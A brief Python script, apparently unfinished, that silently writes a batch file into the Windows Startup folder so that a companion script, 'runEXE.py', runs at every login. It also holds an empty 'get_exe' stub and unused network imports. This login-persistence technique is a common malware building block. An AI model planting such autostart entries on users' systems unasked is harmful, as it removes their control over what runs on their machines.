import getpass, os, requests, threading


USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    if not os.path.isfile(bat_path+f'\open.bat'):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s/runEXE.py' % file_path)
    else:
        print("open.bat already exists!")

#def get_exe():


if __name__ == "__main__":
    add_to_startup()
    print("script ran!")
    input()